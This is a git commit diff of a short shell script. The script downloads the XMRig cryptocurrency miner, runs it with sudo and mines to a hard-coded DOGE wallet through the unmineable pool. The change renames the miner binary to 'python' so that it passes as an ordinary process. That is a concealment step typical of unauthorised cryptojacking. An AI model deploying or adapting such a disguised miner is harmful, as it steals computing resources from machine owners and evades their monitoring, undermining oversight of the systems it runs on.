a7c5da1f2b0ba3090da714ce114ddf128a8c42f6
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-15 16:44:28 +0700

    Update DOGE_unminerable.sh

--- DOGE_unminerable.sh
+++ DOGE_unminerable.sh
@@ -1,4 +1,5 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
 tar xf xmrig-6.15.0-linux-x64.tar.gz
 cd xmrig-6.15.0
-sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DDspGoSAP4MAs8A195kofkTauxJvhPqemi.WORKER01#dsfz-a7ys -p x
+mv xmrig python
+sudo ./python -o rx.unmineable.com:3333 -a rx -k -u DOGE:DDspGoSAP4MAs8A195kofkTauxJvhPqemi.WORKER01#dsfz-a7ys -p x
